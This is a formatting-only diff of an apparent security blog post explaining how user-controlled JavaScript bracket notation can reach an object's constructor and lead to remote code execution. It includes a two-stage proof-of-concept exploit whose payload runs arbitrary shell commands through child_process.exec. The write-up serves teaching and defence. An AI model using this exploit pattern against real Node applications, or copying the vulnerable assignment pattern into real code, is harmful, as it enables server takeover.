@@ -4,36 +4,33 @@ We are going to be looking at some peculiar and potentially dangerous implicatio
 
 Square bracket notation for objects in JavaScript provides a very convenient way to dynamically access a specific property or method based on the contents of a variable. The end result of this feature is something that is very similar to Ruby's Mass Assignment: Given an object, you are able to dynamically assign and retrieve properties of this object without specifying this property should be accessible.
 
-*Note: These examples are simple, and seemingly obvious - we will take a look at that later. For now, disregard the practicality of the examples and focus on the dangerous patterns that they reveal.*
+_Note: These examples are simple, and seemingly obvious - we will take a look at that later. For now, disregard the practicality of the examples and focus on the dangerous patterns that they reveal._
 
 Let's take a look at why this could be a problem.
 
 ### Issue #1: Bracket object notation with user input grants access to every property available on the object.
 
 ```js
-exampleClass[userInput[1]] = userInput[2]
+exampleClass[userInput[1]] = userInput[2];
 ```
 
 I won't spend much time here, as I believe this is fairly well known. If exampleClass contains a sensitive property, the above code will allow it to be edited.
 
-### Issue #2: Bracket object notation with user input grants access to every property available on the object, __*including prototypes.*__
+### Issue #2: Bracket object notation with user input grants access to every property available on the object, **_including prototypes._**
 
 ```js
-userInput = [
-'constructor',
-'{}'
-]
-exampleClass[userInput[1]] = userInput[2]
+userInput = ['constructor', '{}'];
+exampleClass[userInput[1]] = userInput[2];
 ```
 
-This looks pretty innocuous, even if it is an uncommon pattern.  The problem here is that we can access or overwrite prototypes such as `constructor` or `__defineGetter__`, which may be used later on. The most likely outcome of this scenario would be an application crash, when a string is attempted to be called as a function.
+This looks pretty innocuous, even if it is an uncommon pattern. The problem here is that we can access or overwrite prototypes such as `constructor` or `__defineGetter__`, which may be used later on. The most likely outcome of this scenario would be an application crash, when a string is attempted to be called as a function.
 
-### Issue #3: Bracket object notation with user input grants access to every property available on the object, including prototypes, __*which can lead to Remote Code Execution.*__
+### Issue #3: Bracket object notation with user input grants access to every property available on the object, including prototypes, **_which can lead to Remote Code Execution._**
 
 Now here's where things get really dangerous. It's also where example code gets really implausible - bear with me.
 
 ```js
-var user = function() {
+var user = function () {
   this.name = 'jon';
   //An empty user constructor.
 };
@@ -44,24 +41,18 @@ function handler(userInput) {
 }
 ```
 
-In the previous section, I mentioned that constructor can be accessed from square brackets. In this case, since we are dealing with a function, the constructor we get back is the `Function` Constructor,  which compiles a string of code into a function.
+In the previous section, I mentioned that constructor can be accessed from square brackets. In this case, since we are dealing with a function, the constructor we get back is the `Function` Constructor, which compiles a string of code into a function.
 
 ### Exploitation:
 
-In order to exploit the above code, we need a two stage exploit function. 
+In order to exploit the above code, we need a two stage exploit function.
 
 ```js
-function exploit(cmd){
-  var userInputStageOne = [
-    'constructor',
-    'require("child_process").exec(arguments[0],console.log)'
-  ];
-  var userInputStageTwo = [
-    'anyVal',
-    cmd
-  ];
+function exploit(cmd) {
+  var userInputStageOne = ['constructor', 'require("child_process").exec(arguments[0],console.log)'];
+  var userInputStageTwo = ['anyVal', cmd];
 
-  handler(userInputStageOne); 
+  handler(userInputStageOne);
   handler(userInputStageTwo);
 }
 ```
@@ -80,8 +71,8 @@ user['anyVal'] = user['constructor'](userInput[1]);
 Executing this code creates a function containing the payload, and assigns it to `user['anyVal']`:
 
 ```js
-user['anyVal'] = function() {
-  require("child_process").exec(arguments[0],console.log)
+user['anyVal'] = function () {
+  require('child_process').exec(arguments[0], console.log);
 };
 ```
 
